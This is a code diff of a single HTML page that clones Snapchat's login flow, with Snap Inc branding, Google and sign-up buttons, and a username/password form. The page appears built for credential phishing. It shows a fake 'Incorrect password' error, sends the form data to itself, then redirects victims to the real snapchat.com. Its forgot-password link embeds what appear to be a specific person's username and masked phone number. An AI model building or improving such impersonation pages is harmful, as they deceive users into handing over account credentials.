@@ -1,75 +1,38 @@
-<!doctype html>
-<html lang="fr">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no" />
-  <link rel="shortcut icon" href="img/faviconV2.png" />
-  <meta name="description" content="Snapchat clone (maquette) - Un fichier HTML unique" />
-  <title>Snapchat (One-File)</title>
 
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="shortcut icon" href="img/faviconV2.png">
+  <meta name="description" content="Snapchat login clone (app.html: merged previous files)" />
+  <meta property="og:site_name" content="Snapchat Spotlight">
 
-  <style>
-    /* Minimal CSS (one-file). Les styles complets des fichiers existants restent dispo via /css/*.
-       Objectif: rendre toutes les vues utilisables depuis UN seul fichier. */
-    * { -webkit-tap-highlight-color: rgba(255, 255, 255, 0) !important; -webkit-focus-ring-color: rgba(255, 255, 255, 0) !important; outline: none !important; box-sizing: border-box; }
-    body { margin: 0; font-family: 'Poppins', system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background:#0b0b0b; color:#fff; }
-    a { color: #7dd3fc; text-decoration: none; }
-    a:hover { text-decoration: underline; }
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
-    /* Views */
-    .view { display:none; min-height:100vh; }
-    .view.active { display:block; }
+  <!-- Use the SAME CSS as the previous pages -->
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/landing.css">
+  <link rel="stylesheet" href="css/login.css">
 
-    /* Loader (index) */
-    .loader { position: fixed; inset:0; display:flex; align-items:center; justify-content:center; background:#0b0b0b; }
-    .loader .logo { width: 56px; height:56px; border-radius: 14px; background: #111; border:1px solid rgba(255,255,255,.12); }
-
-    /* Bottom text */
-    .bottom-text{ position:fixed; left:0; right:0; bottom:18px; text-align:center; opacity:.9; font-size:12px; }
-
-    /* Landing */
-    .landing { padding: 24px; display:flex; flex-direction:column; gap:16px; align-items:center; justify-content:center; }
-    .ghost-logo-img { width: 110px; height: auto; }
-    .cta { display:flex; flex-direction:column; gap:12px; width: min(360px, 100%); }
-    .pill { border:1px solid rgba(255,255,255,.18); background:#111; color:#fff; padding:14px 18px; border-radius:999px; cursor:pointer; font-weight:600; }
-    .pill-google { background:#111; }
-    .pill-signup { background:#ff2a2a; border-color: rgba(255,42,42,.55); }
-    .pill-text-white { color:#fff; }
-    .helper { margin-top: 10px; opacity:.95; }
-
-    /* Login */
-    .back-button{ position:fixed; top:16px; left:16px; width:34px; height:34px; border-radius:10px; border:none; background:#111; display:flex; align-items:center; justify-content:center; cursor:pointer; }
-    .login-container{ max-width: 420px; margin: 70px auto 0; padding: 20px; }
-    .error-message{ display:block; background:#ff3b3b1f; border:1px solid rgba(255,59,59,.45); padding:12px 14px; border-radius:12px; color:#ffb4b4; margin-bottom:14px; }
-    h1{ margin: 10px 0 18px; font-size:26px; }
-
-    form label{ display:block; font-size:12px; opacity:.9; letter-spacing:.02em; margin: 14px 0 8px; }
-    input[type="text"], input[type="tel"], input[type="password"]{ width:100%; padding:12px 14px; border-radius:12px; border:1px solid rgba(255,255,255,.18); background: rgba(255,255,255,.03); color:#fff; }
-    .password-container{ position:relative; }
-    .toggle-password{ position:absolute; right:10px; top:50%; transform:translateY(-50%); border:none; background:transparent; cursor:pointer; }
-    .save-info{ display:flex; gap:10px; align-items:center; margin-top: 14px; opacity:.95; }
-    .incorrect{ display:none; margin-top: 10px; padding:10px 12px; background: rgba(255, 59, 59, .12); border:1px solid rgba(255,59,59,.35); border-radius:12px; }
-
-    .forgot-password{ margin-top: 10px; font-size: 13px; }
-    .login-button{ width:100%; margin-top:18px; border:none; cursor:pointer; background:#ff2a2a; color:#fff; padding:14px 16px; border-radius:14px; font-weight:700; }
-
-    /* Basic spacing utility */
-    .row { width:100%; }
-  </style>
+  <title>Snapchat (Merged)</title>
 </head>
 <body>
-  <!-- One-file router -->
+  <!-- One-page container: we reuse markup from previous pages -->
+
+  <!-- Splash / Index view -->
   <div id="view-index" class="view active">
-    <div class="loader" aria-hidden="true">
+    <div class="loader">
       <div class="logo"></div>
     </div>
+
     <div class="bottom-text">
       <div class="copyright">© Snap Inc 2026</div>
       <div class="brand">Snapchat</div>
     </div>
   </div>
 
+  <!-- Landing view -->
   <div id="view-landing" class="view">
     <main class="landing">
       <div class="logo-wrap" aria-hidden="true">
@@ -78,6 +41,7 @@
 
       <div class="cta">
         <button type="button" class="pill pill-google" id="btn-google">
+          <span class="google-icon" aria-hidden="true"></span>
           <span class="pill-text">Continuer avec Google</span>
         </button>
 
@@ -93,9 +57,11 @@
     </main>
   </div>
 
+  <!-- Login view -->
   <div id="view-login" class="view">
+    <!-- Back Button -->
     <button class="back-button" id="btn-back">
-      <img src="img/left-arrow.png" height="15" width="15" alt="" />
+      <img src="img/left-arrow.png" height="15px" width="15px" alt="">
     </button>
 
     <div class="login-container">
@@ -106,34 +72,32 @@
       <h1>Log In</h1>
 
       <form action="#" method="POST" id="login-form">
-        <label for="username" id="username-label">USERNAME OR EMAIL</label>
-        <input type="text" id="username" name="name" required />
+        <label for="username">USERNAME OR EMAIL</label>
+        <input type="text" id="username" name="name" required>
 
-        <p class="alternate-option" style="margin:10px 0 0; font-size:13px;">
-          <a href="#" id="switch-to-phone">Use phone number instead</a>
+        <p class="alternate-option">
+          <a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a>
         </p>
 
         <label for="password">PASSWORD</label>
         <div class="password-container">
-          <input type="password" id="password" name="message" required />
-          <button type="button" class="toggle-password" aria-label="toggle password" id="toggle-password">
-            <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye" />
+          <input type="password" id="password" name="message" required>
+          <button type="button" class="toggle-password">
+            <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
           </button>
         </div>
 
         <div class="save-info">
-          <input type="checkbox" id="save-login" />
-          <label for="save-login" style="font-size:13px;">Save Login Info on your device</label>
+          <input type="checkbox" id="save-login">
+          <label for="save-login">Save Login Info on your device</label>
         </div>
 
-        <div class="incorrect" id="incorrect">
+        <div class="incorrect">
           <p>Incorrect password, please try again.</p>
         </div>
 
-        <p class="forgot-password" style="margin:12px 0 0;">
-          <a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%3Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">
-            Forgot your password?
-          </a>
+        <p class="forgot-password">
+          <a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%3Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">Forgot your password?</a>
         </p>
 
         <button type="submit" class="login-button">Log In</button>
@@ -141,9 +105,17 @@
     </div>
   </div>
 
-  <script>
-    // One-file logic based on existing js/index.js + js/login.js
+  <style>
+    /* Minimal router layer only; keep the original CSS look from css/*.css */
+    .view { display:none; min-height:100vh; }
+    .view.active { display:block; }
+  </style>
 
+  <script src="js/index.js"></script>
+  <script src="js/login.js"></script>
+
+  <script>
+    // Merge logic: switch views while letting existing scripts drive UI details.
     const viewIndex = document.getElementById('view-index');
     const viewLanding = document.getElementById('view-landing');
     const viewLogin = document.getElementById('view-login');
@@ -157,10 +129,10 @@
       if (which === 'login') viewLogin.classList.add('active');
     }
 
-    // index -> landing after a delay
+    // default: index then to landing (match previous index.html behavior)
     setTimeout(() => setView('landing'), 2400);
 
-    // landing buttons
+    // Landing to Login
     document.getElementById('btn-google').addEventListener('click', () => setView('login'));
     document.getElementById('btn-signup').addEventListener('click', () => {
       window.location.href = 'https://accounts.snapchat.com/v2/signup';
@@ -170,78 +142,14 @@
       setView('login');
     });
 
-    // login back
+    // Back to Landing
     document.getElementById('btn-back').addEventListener('click', () => setView('landing'));
 
-    // login functionality (inline)
-    function validatePassword(event) {
-      const passwordInput = document.getElementById('password');
-      const incorrectMessage = document.getElementById('incorrect');
-
-      if (passwordInput.value.length < 8) {
-        incorrectMessage.style.display = 'block';
-        event.preventDefault();
-        return false;
-      }
-
-      incorrectMessage.style.display = 'none';
-      redirectToSnapchat();
-      return true;
+    // Make sure login form uses existing logic.
+    const loginForm = document.getElementById('login-form');
+    if (loginForm && typeof validatePassword === 'function') {
+      loginForm.onsubmit = validatePassword;
     }
-
-    function redirectToSnapchat() {
-      setTimeout(() => {
-        window.location.href = 'https://www.snapchat.com/';
-      }, 1000);
-    }
-
-    document.getElementById('login-form').addEventListener('submit', validatePassword);
-
-    window.addEventListener('load', function () {
-      // toggle password visibility
-      const toggleBtn = document.getElementById('toggle-password');
-      if (toggleBtn) {
-        toggleBtn.addEventListener('click', function () {
-          const passwordField = document.getElementById('password');
-          const eyeIcon = document.getElementById('eye-icon');
-
-          if (passwordField.type === 'password') {
-            passwordField.type = 'text';
-            eyeIcon.src = 'img/eye-open.svg';
-          } else {
-            passwordField.type = 'password';
-            eyeIcon.src = 'img/eye-closed.svg';
-          }
-        });
-      }
-
-      // switch between username/email and phone number
-      const switchToPhone = document.getElementById('switch-to-phone');
-      const usernameInput = document.getElementById('username');
-      const label = document.getElementById('username-label');
-
-      switchToPhone.addEventListener('click', function (e) {
-        e.preventDefault();
-        if (label.textContent === 'USERNAME OR EMAIL') {
-          label.textContent = 'PHONE NUMBER';
-          usernameInput.type = 'tel';
-          switchToPhone.textContent = 'Use email instead';
-        } else {
-          label.textContent = 'USERNAME OR EMAIL';
-          usernameInput.type = 'text';
-          switchToPhone.textContent = 'Use phone number instead';
-        }
-      });
-
-      // show error on load, hide after first click
-      const errorMessage = document.getElementById('error-message');
-      errorMessage.style.display = 'block';
-
-      document.body.addEventListener('click', function () {
-        errorMessage.style.display = 'none';
-      }, { once: true });
-    });
   </script>
 </body>
 </html>
-
